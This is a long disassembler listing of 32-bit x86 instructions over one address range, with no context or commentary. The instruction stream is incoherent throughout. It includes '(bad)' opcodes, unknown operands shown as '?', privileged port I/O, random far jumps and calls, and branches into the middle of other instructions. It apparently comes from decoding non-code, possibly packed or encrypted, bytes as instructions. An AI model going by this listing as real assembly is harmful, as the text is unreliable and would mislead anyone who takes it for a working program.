  413623:	ds ret 
  413625:	cdq    
  413626:	div    ah
  413628:	cmp    eax,0x3ed43e1b
  41362d:	das    
  41362e:	add    BYTE PTR [edi],cl
  413630:	ficomp DWORD PTR [ecx]
  413632:	mov    al,0x91
  413634:	mov    DWORD PTR [eax],eax
  413636:	mul    BYTE PTR [edx+edx*4-0x5d438eeb]
  41363d:	mov    ebp,DWORD PTR [ecx-0x8]
  413640:	dec    edx
  413641:	mov    eax,ds:0x555e3e29
  413646:	mov    esi,0x6aca6b49
  41364b:	sub    al,BYTE PTR [esi-0x32]
  41364e:	lea    esp,[ecx+edi*4-0x54]
  413652:	jecxz  0x413665
  413654:	lock in eax,dx
  413656:	jmp    0x7d97:0x3af23236
  41365d:	cmp    bh,BYTE PTR [esi-0x6d]
  413660:	mov    dl,BYTE PTR [eax]
  413662:	ret    0xb115
  413665:	push   cs
  413666:	jge    0x4135e9
  413668:	not    DWORD PTR [ebx+edx*4]
  41366b:	fcom   DWORD PTR [edx+0x1a72929e]
  413671:	pop    ds
  413672:	out    dx,eax
  413673:	mov    ?,WORD PTR [edx+edi*2]
  413676:	into   
  413677:	test   al,0x8a
  413679:	fcmovu st,st(1)
  41367b:	rcr    DWORD PTR [ecx-0x1bf7423],cl
  413681:	add    eax,0x40235a3
  413686:	dec    ecx
  413687:	sub    al,0xb5
  413689:	xor    ebp,DWORD PTR [eax+ebp*2]
  41368c:	push   esi
  41368d:	rol    BYTE PTR [eax-0x32],1
  413690:	mov    eax,0x2c181341
  413695:	mov    DWORD PTR ds:0xe9eaa781,ebp
  41369b:	out    0x5,al
  41369d:	jbe    0x413707
  41369f:	psubd  mm0,QWORD PTR [edi]
  4136a2:	add    dl,BYTE PTR [edx-0x64c79c76]
  4136a8:	mov    al,ds:0x53de62f9
  4136ad:	mov    ds:0x2fba5b1e,al
  4136b2:	mov    dh,BYTE PTR [ecx+0x78]
  4136b5:	or     ebp,DWORD PTR [edi+0x45]
  4136b8:	pop    edx
  4136b9:	push   0x33
  4136bb:	aaa    
  4136bc:	mov    ds:0x47af2f29,eax
  4136c1:	adc    eax,DWORD PTR [ecx]
  4136c3:	add    ch,bh
  4136c5:	pop    es
  4136c6:	ret    0x1041
  4136c9:	fadd   DWORD PTR [esi+0x46ee6916]
  4136cf:	xor    ecx,DWORD PTR [ecx+ecx*1+0x6e]
  4136d3:	retf   
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	jmp    0x5c04d1c6
  4136da:	adc    DWORD PTR [edi],esp
  4136dc:	pop    eax
  4136dd:	cdq    
  4136de:	xor    BYTE PTR [edi],dh
  4136e0:	repnz mov ah,0xa8
  4136e3:	test   al,0xd3
  4136e5:	push   ds
  4136e6:	pop    ss
  4136e7:	adc    ebx,0xffffffc4
  4136ea:	inc    edx
  4136eb:	mov    ah,0xbf
  4136ed:	repnz shl DWORD PTR [ebx+0x3],0xf6
  4136f2:	pop    esp
  4136f3:	mov    esp,0x1d4fd0e2
  4136f8:	xor    DWORD PTR [ecx-0x27],ebp
  4136fb:	inc    esp
  4136fc:	gs sub ch,dl
  4136ff:	ds push 0x4e
  413702:	das    
  413703:	rcl    BYTE PTR [esi],1
  413705:	mov    eax,0xad179e9d
  41370a:	adc    BYTE PTR [esi],al
  41370c:	mov    ebx,0x67962e14
  413711:	dec    eax
  413712:	lds    ebp,FWORD PTR [ecx+ecx*8+0x18e3d1b9]
  413719:	mov    ?,WORD PTR [edx-0x2041eca]
  41371f:	enter  0xce6d,0xcb
  413723:	aad    0x5c
  413725:	mov    BYTE PTR [edx],ch
  413727:	inc    ecx
  413728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413729:	inc    ebx
  41372a:	(bad)  
  41372b:	xchg   ecx,eax
  41372c:	sbb    eax,0x1f3b9bea
  413731:	and    BYTE PTR ds:0x8fb5e9c5,dl
  413737:	pop    esp
  413738:	popa   
  413739:	in     eax,0xc9
  41373b:	mov    al,0x16
  41373d:	inc    esi
  41373e:	aad    0xa6
  413740:	test   al,0xad
  413743:	xor    BYTE PTR [edx],ch
  413745:	xor    dl,BYTE PTR [edi-0x3c]
  413748:	pop    esp
  413749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41374a:	adc    eax,esi
  41374c:	sub    eax,0xaa876667
  413751:	dec    ebx
  413752:	or     BYTE PTR [edi-0x81de6ee],cl
  413758:	jge    0x413719
  41375a:	push   esp
  41375b:	test   BYTE PTR [eax-0x60522cc1],0xd4
  413762:	push   ss
  413763:	hlt    
  413764:	aas    
  413765:	ficom  DWORD PTR [ecx-0x21]
  413768:	pusha  
  413769:	cld    
  41376a:	sbb    esp,0xe2a8699
  413770:	call   0x9e1152bb
  413775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413776:	test   al,0x4
  413778:	ins    BYTE PTR es:[edi],dx
  413779:	scas   al,BYTE PTR es:[edi]
  41377a:	aaa    
  41377b:	fld    QWORD PTR [ebp+0x27a88ef8]
  413781:	fcmovu st,st(1)
  413783:	(bad)  
  413784:	sub    edx,DWORD PTR [esi-0x17]
  413787:	ds pop edx
  413789:	cmp    eax,0x4f47047d
  41378e:	les    esi,FWORD PTR [ebp-0xa91b141]
  413794:	xor    al,0xe2
  413796:	mov    eax,ds:0xee5504ba
  41379b:	shr    BYTE PTR [ebp-0x55],0x79
  41379f:	mov    al,ds:0xc36a9959
  4137a4:	test   al,0x44
  4137a6:	icebp  
  4137a7:	xor    al,0x61
  4137a9:	loopne 0x41378f
  4137ab:	in     al,dx
  4137ac:	movntps XMMWORD PTR [edi-0x15],xmm7
  4137b0:	cmp    BYTE PTR [ecx+ecx*4-0x76],dl
  4137b4:	inc    esi
  4137b5:	mov    ch,0x12
  4137b7:	ret    0x48ae
  4137ba:	xor    eax,0xf9bd7e0c
  4137bf:	inc    esi
  4137c0:	ins    DWORD PTR es:[edi],dx
  4137c1:	stos   BYTE PTR es:[edi],al
  4137c2:	rol    BYTE PTR [ebp+0x51],0xc1
  4137c6:	retf   0xbd8f
  4137c9:	int    0x9
  4137cb:	pop    eax
  4137cc:	lds    ebp,FWORD PTR [esi]
  4137ce:	stos   DWORD PTR es:[edi],eax
  4137cf:	(bad)  
  4137d0:	fucomp st(2)
  4137d2:	push   0xffffff87
  4137d4:	xchg   BYTE PTR [esi+0x2b710d9c],bl
  4137da:	shr    BYTE PTR [esi+0x3f],0xf9
  4137de:	xchg   ax,ax
  4137e0:	dec    esp
  4137e1:	lahf   
  4137e2:	fs nop
  4137e4:	jne    0x413774
  4137e6:	push   esp
  4137e7:	ins    DWORD PTR es:[edi],dx
  4137e8:	aad    0xc4
  4137ea:	(bad)
  4137ed:	cmp    eax,0xdf1bfb14
  4137f2:	ja     0x4137f3
  4137f4:	dec    esp
  4137f5:	cmp    ch,BYTE PTR [edi+ebx*8+0x59]
  4137f9:	pop    eax
  4137fa:	mov    eax,0x498538cc
  4137ff:	call   0x8c6982d2
  413804:	and    esi,DWORD PTR [ebx+0x1d]
  413807:	xchg   ecx,eax
  413808:	push   edx
  413809:	shl    BYTE PTR [esi+0x6a868903],cl
  41380f:	sub    edx,DWORD PTR fs:[edx-0x55]
  413813:	loope  0x413861
  413815:	lods   eax,DWORD PTR ds:[esi]
  413816:	out    dx,al
  413817:	call   0xa1d9:0xc21b8fd9
  41381e:	and    al,BYTE PTR ds:0xd36fb917
  413824:	xor    eax,0x8adef0de
  413829:	pop    ds
  41382a:	fnstcw WORD PTR [edi]
  41382c:	ins    BYTE PTR es:[edi],dx
  41382d:	mov    eax,ds:0xe87a7538
  413832:	sahf   
  413833:	dec    esp
  413834:	mov    bl,0x4a
  413836:	mov    ?,ebp
  413838:	repz in al,0x84
  41383b:	push   0xffffffd5
  41383d:	or     bx,si
  413840:	loop   0x4138af
  413842:	add    esp,0x7d
  413845:	mov    eax,ebp
  413847:	popa   
  413848:	sbb    DWORD PTR [ecx-0x55],edx
  41384b:	retf   
  41384c:	and    edx,DWORD PTR ds:0x2892b054
  413852:	and    eax,0x43a6025b
  413857:	xor    BYTE PTR [edx],ch
  413859:	out    0xd5,eax
  41385b:	ror    DWORD PTR [edx+0x5c],cl
  41385e:	sbb    eax,0xd100b3da
  413863:	ins    DWORD PTR es:[edi],dx
  413864:	push   0xa7b2d321
  413869:	mov    bh,0x2f
  41386b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41386c:	mov    WORD PTR [eax+0x827c3c5],cs
  413872:	sub    eax,DWORD PTR [ebx-0x4b]
  413875:	loop   0x4138de
  413877:	fisubr WORD PTR [edx-0x8]
  41387a:	sub    ebp,edi
  41387c:	and    eax,0x87387bd1
  413881:	cli    
  413882:	mov    WORD PTR [ebx],ds
  413884:	test   BYTE PTR ds:0xfffef1cd,0x45
  41388b:	add    ecx,DWORD PTR [edi]
  41388d:	loope  0x413816
  41388f:	dec    edi
  413890:	ins    BYTE PTR es:[edi],dx
  413891:	ret    
  413892:	and    esi,DWORD PTR [eax+0x52]
  413895:	push   ds
  413896:	sbb    al,0xba
  413898:	dec    ebx
  413899:	xor    DWORD PTR [esp+edi*1-0x42],esi
  41389d:	mov    al,0x5b
  41389f:	retf   0xfcdc
  4138a2:	mov    dl,0x27
  4138a4:	pop    ecx
  4138a5:	dec    eax
  4138a6:	cmc    
  4138a7:	xlat   BYTE PTR ds:[ebx]
  4138a8:	cwde   
  4138a9:	fisub  WORD PTR [esp+eiz*4-0x20651f2]
  4138b0:	adc    DWORD PTR [esi+0x13],eax
  4138b3:	jmp    0xa269:0x4e53e8a9
  4138ba:	in     eax,dx
  4138bb:	rol    BYTE PTR [eax-0x51e038ae],1
  4138c1:	or     ah,BYTE PTR [ebx+0x1884f5ae]
  4138c7:	adc    dh,BYTE PTR [esp+ebx*2]
  4138ca:	dec    esp
  4138cb:	cmp    BYTE PTR [eax],bh
  4138cd:	dec    ebx
  4138ce:	ins    BYTE PTR es:[edi],dx
  4138cf:	out    0x85,eax
  4138d1:	xchg   esp,eax
  4138d2:	das    
  4138d3:	pop    es
  4138d4:	pop    edx
  4138d5:	or     eax,0x59a24583
  4138da:	jle    0x41395b
  4138dc:	(bad)  
  4138dd:	xchg   esi,eax
  4138de:	inc    esi
  4138df:	inc    ebp
  4138e0:	cld    
  4138e1:	imul   esp,DWORD PTR [ecx+0x12],0x1a
  4138e5:	fnstenv [ecx+0x29db6d19]
  4138eb:	ds aaa 
  4138ed:	push   ecx
  4138ee:	push   ds
  4138ef:	push   esi
  4138f0:	mov    ecx,0x985568dd
  4138f5:	cmp    al,0x92
  4138f7:	dec    eax
  4138f8:	dec    esp
  4138f9:	or     dl,BYTE PTR [ebx+ecx*2-0x7218f54e]
  413900:	mov    eax,ds:0xd00c81ab
  413905:	push   esi
  413906:	out    0x4c,eax
  413908:	retf   0xe343
  41390b:	jg     0x4138df
  41390d:	or     ebx,DWORD PTR [edx-0x64]
  413910:	pop    ecx
  413911:	lahf   
  413912:	fwait
  413913:	jg     0x413973
  413915:	mov    dh,0x36
  413917:	and    eax,0x6ae209ac
  41391c:	jno    0x413942
  41391e:	lahf   
  41391f:	mov    eax,0x2276dae0
  413924:	jmp    0x80b9f04
  413929:	lahf   
  41392a:	jnp    0x413944
  41392c:	pop    ss
  41392d:	mov    DWORD PTR [ecx+0x3ee1204c],ebx
  413933:	jg     0x413981
  413935:	sub    DWORD PTR [ebx+0x3b],edx
  413938:	mov    DWORD PTR [ebx],edi
  41393a:	xchg   esp,eax
  41393b:	sar    BYTE PTR [esi],1
  41393d:	call   FWORD PTR [ecx+0x1f]
  413940:	inc    edx
  413941:	xor    edi,eax
  413943:	inc    ecx
  413944:	shr    dh,cl
  413946:	xchg   esp,eax
  413947:	inc    edx
  413948:	and    al,0x2
  41394a:	loopne 0x413978
  41394c:	pop    edx
  41394d:	pushf  
  41394e:	into   
  41394f:	inc    ecx
  413950:	xor    al,0xff
  413952:	loop   0x4139b9
  413954:	add    ch,BYTE PTR [edx*8+0xf5e1a0]
  41395b:	test   DWORD PTR [edi+0x4f5b3892],eax
  413961:	push   esi
  413962:	fld    TBYTE PTR [eax]
  413964:	fbstp  TBYTE PTR [eax-0x37]
  413967:	jb     0x413918
  413969:	jo     0x4138f7
  41396b:	mov    bh,0xcd
  41396d:	fisttp DWORD PTR [ecx]
  41396f:	pushf  
  413970:	loope  0x4138f5
  413972:	lods   eax,DWORD PTR ds:[esi]
  413973:	add    BYTE PTR [edi+0x6f],dl
  413976:	sub    DWORD PTR [edi-0x9],eax
  413979:	sbb    dl,ch
  41397b:	cld    
  41397c:	sbb    ebp,esi
  41397e:	cmp    DWORD PTR [ecx],edx
  413980:	and    ecx,DWORD PTR [eax+ebp*4+0x70]
  413984:	imul   BYTE PTR ds:[edi]
  413987:	jmp    0x41394a
  413989:	dec    ebp
  41398a:	add    eax,0x3af0541a
  41398f:	not    BYTE PTR [edi-0x4e]
  413992:	cdq    
  413993:	and    eax,DWORD PTR [esp+esi*4+0x14]
  413997:	pop    edi
  413998:	mov    bh,0x20
  41399a:	sub    al,0xc6
  41399c:	fcmovb st,st(3)
  41399e:	sbb    cl,BYTE PTR [ecx+0x288ca57d]
  4139a4:	fnstsw WORD PTR [ebx]
  4139a6:	and    eax,0x4067f7b1
  4139ab:	ins    DWORD PTR es:[edi],dx
  4139ac:	outs   dx,BYTE PTR ds:[esi]
  4139ad:	shr    DWORD PTR [esi-0x61],0xb1
  4139b1:	sbb    BYTE PTR [ebx+0x63e50d0],dl
  4139b7:	jge    0x41393f
  4139b9:	imul   esi,DWORD PTR [esi],0x6
  4139bc:	sbb    esi,DWORD PTR [ecx+edx*4]
  4139bf:	loope  0x413999
  4139c1:	lods   al,BYTE PTR ds:[esi]
  4139c2:	aad    0xa1
  4139c4:	pop    edx
  4139c5:	or     edi,DWORD PTR [ecx+0x73]
  4139c8:	inc    edx
  4139c9:	xchg   DWORD PTR [edx+0x5b0b44f0],ebx
  4139cf:	repnz and cl,BYTE PTR [esi]
  4139d2:	jp     0x413a0e
  4139d4:	fstp   TBYTE PTR [edi+0x2bd668fe]
  4139da:	jae    0x413966
  4139dc:	ss pop edx
  4139de:	imul   ecx,DWORD PTR [esi+0x7b1f7fb5],0x19
  4139e5:	cmc    
  4139e6:	repnz into 
  4139e8:	jae    0x413a52
  4139ea:	push   es
  4139eb:	cmc    
  4139ec:	xlat   BYTE PTR ds:[ebx]
  4139ed:	icebp  
  4139ee:	cmp    al,dl
  4139f0:	jno    0x413a22
  4139f2:	shr    BYTE PTR [eax+ebx*2+0x587986fd],cl
  4139f9:	retf   0x3ac2
  4139fc:	jge    0x4139bc
  4139fe:	mov    cl,0x2b
  413a00:	mov    esi,0xe55d8260
  413a05:	in     eax,dx
  413a06:	jge    0x41399d
  413a08:	jbe    0x413a06
  413a0a:	pop    ebx
  413a0b:	cmp    BYTE PTR [edx],al
  413a0d:	mov    BYTE PTR ds:[eax-0x41],cl
  413a11:	fmul   QWORD PTR [ebp-0x23]
  413a14:	cli    
  413a15:	mov    BYTE PTR [edi-0x2e],bh
  413a18:	vmwrite edx,DWORD PTR [si-0x6aff]
  413a1e:	test   al,0xad
  413a20:	pop    esi
  413a21:	inc    edi
  413a22:	cdq    
  413a23:	shl    BYTE PTR [edx-0x75f77594],1
  413a29:	pop    ss
  413a2a:	(bad)  [edx-0x64]
  413a2d:	sub    DWORD PTR ds:0xaef42aae,esi
  413a33:	repnz loopne 0x413a84
  413a36:	inc    esi
  413a37:	call   0xe100df0f
  413a3c:	cld    
  413a3d:	aam    0xf2
  413a3f:	add    BYTE PTR [ebx+0x7f],ch
  413a42:	inc    ecx
  413a43:	pop    ebx
  413a44:	or     DWORD PTR [edi+0x3c],eax
  413a47:	xor    BYTE PTR [ecx-0x99779e1],ch
  413a4d:	cmp    BYTE PTR [esi-0x67],0xd3
  413a51:	mov    dh,0x5d
  413a53:	or     al,0x88
  413a55:	mov    ds:0x46edd2de,eax
  413a5a:	iret   
  413a5b:	sahf   
  413a5c:	adc    al,0x2f
  413a5e:	cmp    eax,0x6b46aea0
  413a63:	inc    edx
  413a64:	cmp    DWORD PTR [ebp+ecx*4+0x53],esp
  413a68:	adc    al,bl
  413a6a:	mov    dh,0x15
  413a6c:	cmp    dl,BYTE PTR [esi+ebx*1+0x7c01c93a]
  413a73:	push   cs
  413a74:	mov    bh,0x5a
  413a76:	out    0xad,eax
  413a78:	pop    eax
  413a79:	mov    dl,0x13
  413a7b:	ror    BYTE PTR [edi-0x30279142],cl
  413a81:	jno    0x413a63
  413a83:	lods   eax,DWORD PTR ds:[esi]
  413a84:	jno    0x413aa4
  413a86:	push   es
  413a87:	sub    al,0xc7
  413a89:	iret   
  413a8a:	xchg   dh,ah
  413a8c:	les    edi,FWORD PTR [ebx+0x5577e1fb]
  413a92:	sbb    eax,0x96437cc6
  413a97:	jmp    0x6d38:0x7565e19b
  413a9e:	cmp    ch,BYTE PTR [esi+0x18]
  413aa1:	inc    edi
  413aa2:	jg     0x413a8f
  413aa4:	add    BYTE PTR [esi+0x49],bl
  413aa7:	and    DWORD PTR [edx+0x63],ebp
  413aaa:	mov    dh,0xf0
  413aac:	jae    0xf56f2c13
  413ab2:	test   DWORD PTR [edi],ebp
  413ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab5:	out    dx,eax
  413ab6:	popf   
  413ab7:	in     eax,dx
  413ab8:	mov    edi,0xb2deab3b
  413abd:	xchg   bh,ch
  413abf:	fmul   DWORD PTR [esp+edx*1-0x72]
  413ac3:	sub    ah,cl
  413ac5:	fstp   TBYTE PTR [ecx-0x33]
  413ac8:	xchg   edx,eax
  413ac9:	(bad)  
  413aca:	jmp    0x413ac5
  413acc:	adc    dh,BYTE PTR [esi]
  413ace:	sub    BYTE PTR [edi+edx*2-0x61],al
  413ad2:	loopne 0x413a99
  413ad4:	fsub   QWORD PTR [edi]
  413ad6:	jg     0x413a68
  413ad8:	add    ecx,DWORD PTR [edx+0x21]
  413adb:	sub    DWORD PTR [ecx+ebp*2+0xf],ebp
  413adf:	jne    0x413ad3
  413ae1:	fldcw  WORD PTR ds:0x15746a21
  413ae7:	inc    edi
  413ae8:	outs   dx,DWORD PTR ds:[si]
  413aea:	call   0xb8cd:0x2940a86f
  413af1:	xchg   esp,eax
  413af2:	mov    ah,0x65
  413af4:	mov    eax,0xa78c0e16
  413af9:	dec    edi
  413afa:	add    al,0x7e
  413afc:	fnstsw WORD PTR [eax*1-0x157c0a2c]
  413b03:	rcl    BYTE PTR [esi*8-0x59473da9],1
  413b0a:	out    dx,al
  413b0b:	or     dh,dh
  413b0d:	mov    ss,WORD PTR [eax]
  413b0f:	aad    0xe
  413b11:	lods   al,BYTE PTR ds:[esi]
  413b12:	fucomi st,st(6)
  413b14:	leave  
  413b15:	jle    0x413b5c
  413b17:	xchg   ebx,eax
  413b18:	add    eax,0x623aaaa8
  413b1d:	pop    ebp
  413b1e:	pop    edx
  413b1f:	sub    al,0x1a
  413b21:	jo     0x413b5d
  413b23:	xchg   ebp,eax
  413b24:	icebp  
  413b25:	mov    ecx,ecx
  413b27:	cld    
  413b28:	xor    BYTE PTR [ecx-0x59],cl
  413b2b:	in     eax,0xd5
  413b2d:	ins    BYTE PTR es:[edi],dx
  413b2e:	outs   dx,BYTE PTR ds:[esi]
  413b2f:	es xor edx,ebp
  413b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b33:	sbb    al,BYTE PTR [ecx]
  413b35:	cmp    cl,dh
  413b37:	xchg   ebx,eax
  413b38:	jnp    0x413b88
  413b3a:	dec    edx
  413b3b:	cdq    
  413b3c:	int3   
  413b3d:	jnp    0x413ade
  413b3f:	jo     0x413b36
  413b41:	jp     0x413bbd
  413b43:	pop    edi
  413b44:	inc    edi
  413b45:	jbe    0x413b08
  413b47:	jp     0x413b2f
  413b49:	xchg   edi,eax
  413b4b:	or     DWORD PTR [edi-0x36],edi
  413b4e:	addr16 loope 0x413b37
  413b51:	ffree  st(0)
  413b53:	shl    bl,cl
  413b55:	jnp    0x413ba3
  413b57:	pop    ss
  413b58:	cmp    DWORD PTR [ebx-0x5f],0xdcdc5e2f
  413b5f:	mov    ?,edx
  413b61:	inc    edi
  413b62:	inc    ecx
  413b63:	ret    
  413b64:	pushf  
  413b65:	pop    ecx
  413b66:	mov    bl,0x78
  413b68:	ins    BYTE PTR es:[edi],dx
  413b69:	sub    al,0x77
  413b6b:	inc    edx
  413b6c:	mov    ah,0xc6
  413b6e:	mov    dh,0xce
  413b70:	loopne 0x413ba7
  413b72:	cli    
  413b73:	or     al,0xf5
  413b75:	shl    DWORD PTR [ecx],cl
  413b77:	mov    ebx,0x8649dd87
  413b7c:	cmp    ah,al
  413b7e:	loopne 0x413bb4
  413b80:	dec    esi
  413b81:	(bad)  
  413b82:	aam    0x52
  413b84:	or     WORD PTR [edi-0x538522a7],di
  413b8b:	dec    edi
  413b8c:	lock xor eax,0x6960880c
  413b92:	daa    
  413b93:	push   ecx
  413b94:	add    edx,DWORD PTR [ecx+0x67]
  413b97:	lds    esp,FWORD PTR [eax+0x9]
  413b9a:	pop    ebp
  413b9b:	push   ecx
  413b9c:	ret    0xe250
  413b9f:	les    edx,FWORD PTR fs:[ecx+0x34ab685a]
  413ba6:	jg     0x413bd5
  413ba8:	push   ebp
  413ba9:	das    
  413baa:	inc    eax
  413bab:	mov    bh,0x7e
  413bad:	pcmpgtb mm2,QWORD PTR [ecx]
  413bb0:	mov    ecx,0xcba5cbc0
  413bb5:	jo     0x413b5c
  413bb7:	loope  0x413be8
  413bb9:	or     al,0x75
  413bbb:	jp     0x413b6d
  413bbd:	loopne 0x413c08
  413bbf:	(bad)  
  413bc0:	scas   al,BYTE PTR es:[edi]
  413bc1:	push   cs
  413bc2:	mov    ds:0x4736ca3c,eax
  413bc7:	mov    DWORD PTR [ebx+ecx*2+0x577d844c],ecx
  413bce:	xchg   edx,eax
  413bcf:	mov    esi,0x7217fa7b
  413bd4:	push   ecx
  413bd5:	nop
  413bd6:	cmp    al,bh
  413bd8:	stos   BYTE PTR es:[edi],al
  413bd9:	sub    al,0x49
  413bdb:	and    BYTE PTR [eax+0x9],bh
  413bde:	mov    bl,0xc7
  413be0:	mov    dh,0x6e
  413be2:	sar    DWORD PTR [ecx+0x4f],1
  413be5:	sub    BYTE PTR [edx+ecx*1-0x10],dh
  413be9:	les    edx,FWORD PTR [esi-0x6ad2b175]
  413bef:	ror    DWORD PTR [edx+edi*4+0x259f3ef7],1
  413bf6:	mov    ah,0x60
  413bf8:	imul   esp,DWORD PTR [ebx-0x247b0cb1],0xacee02ff
  413c02:	call   0x3cfe:0xd05dd4ab
  413c09:	jmp    0xdbcce74e
  413c0e:	bndldx bnd2,[eax+eiz*4+0x59382027]
  413c16:	sbb    ecx,DWORD PTR [edi-0x56]
  413c19:	mov    cl,0xba
  413c1b:	cmp    DWORD PTR [edx-0x7b],esi
  413c1e:	les    edi,FWORD PTR [ebx]
  413c20:	inc    ecx
  413c21:	pop    ebx
  413c22:	fdiv   st(2),st
  413c24:	clc    
  413c25:	out    dx,al
  413c26:	test   al,0x2b
  413c28:	sub    DWORD PTR ds:0x16cfc3,0xc
  413c2f:	jecxz  0x413c31
  413c31:	adc    dl,BYTE PTR [ebx-0x71b757d]
  413c37:	cld    
  413c38:	jecxz  0x413c42
  413c3a:	inc    eax
  413c3b:	cld    
  413c3c:	mov    WORD PTR [eax],cs
  413c3e:	mov    bl,0xf0
  413c40:	rcl    BYTE PTR [ebx+0x36b30505],cl
  413c46:	std    
  413c47:	push   eax
  413c48:	ror    DWORD PTR [esi-0x42],1
  413c4b:	mov    dh,0x25
  413c4d:	lock sbb al,0x7e
  413c50:	leave  
  413c51:	gs mov esp,0x6245d3a1
  413c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c58:	rcl    BYTE PTR [ecx],cl
  413c5a:	dec    eax
  413c5b:	stos   BYTE PTR es:[edi],al
  413c5c:	sbb    eax,0x2378d31c
  413c61:	pop    ss
  413c62:	xor    BYTE PTR [ebp-0x33],bl
  413c65:	sbb    bl,BYTE PTR [edx+0x65]
  413c68:	inc    ebp
  413c69:	jl     0x413c2e
  413c6b:	adc    eax,0x1e62818c
  413c70:	aaa    
  413c71:	(bad)  
  413c72:	pop    ebp
  413c73:	neg    BYTE PTR [ebx+0x2a]
  413c76:	push   ss
  413c77:	out    dx,al
  413c78:	aaa    
  413c79:	int3   
  413c7a:	ja     0x413c4a
  413c7c:	inc    edx
  413c7d:	stos   DWORD PTR es:[edi],eax
  413c7e:	je     0x413ca3
  413c80:	mov    ah,0xd3
  413c82:	mov    eax,ds:0x4b29d9b5
  413c87:	in     eax,0x73
  413c89:	xchg   esp,eax
  413c8a:	or     ch,ah
  413c8c:	test   BYTE PTR [ebx-0x2335abf8],dl
  413c92:	dec    ebp
  413c93:	xchg   DWORD PTR [edx],edi
  413c95:	sub    al,0x5d
  413c97:	mov    dl,0xf0
  413c99:	cli    
  413c9a:	jmp    0x413c92
  413c9c:	xchg   ecx,eax
  413c9d:	outs   dx,DWORD PTR ds:[esi]
  413c9e:	mov    al,ds:0xdc796245
  413ca3:	or     ch,BYTE PTR [eax]
  413ca5:	mov    esi,0x240cb90
  413caa:	add    BYTE PTR [eax],cl
  413cac:	in     eax,dx
  413cad:	mov    cl,0xc5
  413caf:	or     eax,0x702f5bb0
  413cb4:	cdq    
  413cb5:	adc    eax,0x20ae0571
  413cba:	and    eax,edx
  413cbc:	addr16 sbb eax,0xa8c168ab
  413cc2:	fmul   QWORD PTR [ebp-0x40716501]
  413cc8:	das    
  413cc9:	inc    eax
  413cca:	dec    esi
  413ccb:	rcl    dh,cl
  413ccd:	or     edx,esi
  413ccf:	pop    esp
  413cd0:	push   es
  413cd1:	ss jmp 0x413cb1
  413cd4:	cmc    
  413cd5:	pop    es
  413cd6:	jb     0x413d51
  413cd8:	sub    al,0x30
  413cda:	sbb    bh,BYTE PTR [edi-0x1d3b8394]
  413ce0:	test   DWORD PTR [edx-0x6a],ebp
  413ce3:	mov    ah,0x6b
  413ce5:	inc    ebp
  413ce6:	fnstsw WORD PTR [edx-0x4c]
  413ce9:	sub    al,0x1f
  413ceb:	mov    esi,0x4f7f5134
  413cf0:	push   0x3a
  413cf2:	(bad)  
  413cf3:	mov    ah,0x97
  413cf5:	mov    WORD PTR [edx],?
  413cf7:	add    ah,al
  413cf9:	xchg   edx,eax
  413cfa:	outs   dx,DWORD PTR ds:[esi]
  413cfb:	retf   0x602c
  413cfe:	repz or ebp,DWORD PTR [ecx-0x44]
  413d02:	inc    esi
  413d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d04:	test   DWORD PTR [ebx-0x6f],eax
  413d07:	pushf  
  413d08:	sub    ah,ah
  413d0a:	pop    ds
  413d0b:	add    eax,0x4a0f717f
  413d10:	or     eax,0xe327cddf
  413d15:	xor    edx,edx
  413d17:	popf   
  413d18:	mov    ds:0x40f1ef20,eax
  413d1d:	push   esi
  413d1e:	es scas eax,DWORD PTR es:[edi]
  413d20:	fdivrp st(2),st
  413d22:	sti    
  413d23:	xchg   edx,eax
  413d24:	sub    esi,DWORD PTR [edx]
  413d26:	sbb    bh,ah
  413d28:	stos   DWORD PTR es:[edi],eax
  413d29:	push   0x6d
  413d2b:	xchg   edx,eax
  413d2c:	xchg   DWORD PTR [edx+0x325be7d1],esi
  413d32:	cmp    al,0x3
  413d34:	lods   eax,DWORD PTR ds:[esi]
  413d35:	push   eax
  413d36:	loope  0x413d04
  413d38:	sbb    BYTE PTR [esi],0xa2
  413d3b:	popa   
  413d3c:	mov    dh,0x50
  413d3e:	or     eax,0xf2826ea5
  413d43:	stos   DWORD PTR es:[edi],eax
  413d44:	xchg   edi,eax
  413d45:	and    edi,eax
  413d47:	add    dh,bh
  413d49:	dec    edx
  413d4a:	call   0xca79:0x9d749e40
  413d51:	cdq    
  413d52:	jle    0x413d4f
  413d54:	leave  
  413d55:	dec    ecx
  413d56:	jge    0x413dba
  413d58:	inc    edi
  413d59:	mov    esi,0x43d3c47e
  413d5e:	sbb    edi,DWORD PTR [esi]
  413d60:	mov    ebx,0x1ae8b8b
  413d65:	mov    edi,es
  413d67:	test   al,0x0
  413d69:	jmp    0x413d27
  413d6b:	mov    dx,bx
  413d6e:	sub    al,0x9a
  413d70:	mov    ds:0x22ee2fb9,eax
  413d75:	adc    ah,ch
  413d77:	das    
  413d78:	mov    ebx,DWORD PTR [edi+0x22]
  413d7b:	pop    ebx
  413d7c:	sbb    ebx,DWORD PTR [eax+ebx*8]
  413d7f:	push   edi
  413d80:	mov    bh,0x1c
  413d82:	cmp    eax,0x6b408511
  413d87:	cmp    al,0xdb
  413d89:	sub    eax,0x286477fb
  413d8e:	dec    esi
  413d8f:	sbb    cl,dl
  413d91:	in     al,dx
  413d92:	pop    es
  413d93:	mov    BYTE PTR [ebp-0x45],ah
  413d96:	push   ss
  413d97:	in     al,0xb1
  413d99:	idiv   al
  413d9b:	loopne 0x413def
  413d9d:	sahf   
  413d9e:	add    edx,DWORD PTR [edi-0x1c]
  413da1:	lea    ebp,[eax-0x11732787]
  413da7:	repnz dec ebp
  413da9:	jae    0x413d88
  413dab:	(bad)  
  413dac:	lods   eax,DWORD PTR ds:[esi]
  413dad:	jp     0x413e09
  413daf:	pop    ss
  413db0:	push   0xa79476be
  413db5:	jecxz  0x413d7e
  413db7:	jb     0x413dd6
  413db9:	fs loopne 0x413d5b
  413dbc:	bound  ebx,QWORD PTR [ecx+0x2]
  413dbf:	push   0xffffff9e
  413dc1:	lods   eax,DWORD PTR ds:[esi]
  413dc2:	jno    0x413dde
